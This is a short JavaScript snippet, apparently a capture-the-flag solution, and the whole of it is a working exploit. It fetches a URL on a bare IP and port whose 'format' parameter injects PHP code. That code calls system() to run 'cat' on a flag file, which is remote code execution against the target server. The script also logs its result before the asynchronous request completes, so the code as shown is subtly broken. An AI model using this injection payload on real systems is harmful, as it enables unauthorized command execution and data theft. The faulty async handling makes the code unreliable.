var data = '';
fetch('http://159.65.95.35:32489/?format={$_GET[0]($_GET[1])}&0=system&1=cat%20../flagjPtd3').then((x) => x.text()).then((x) => data = x);
console.log(data.split("<html>")[0]);
